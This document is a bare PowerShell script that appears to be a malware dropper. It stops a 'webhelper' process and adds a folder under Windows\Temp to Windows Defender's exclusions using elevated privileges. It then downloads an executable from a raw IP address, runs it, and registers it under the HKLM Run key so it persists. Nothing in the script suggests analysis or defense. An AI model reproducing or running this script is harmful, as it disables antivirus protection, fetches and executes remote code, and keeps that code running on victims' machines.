Stop-Process -Name webhelper;
mkdir "$env:windir\temp\Cache";
Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force';
Invoke-WebRequest -Uri "http://144.172.92.207:3654/main" -OutFile "$env:windir\temp\Cache\webhelper.exe";
Start-Process "$env:windir\temp\Cache\webhelper.exe";
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run" -Name "webhelper" -Value "$env:windir\temp\Cache\webhelper.exe" -PropertyType "String";
EXIT
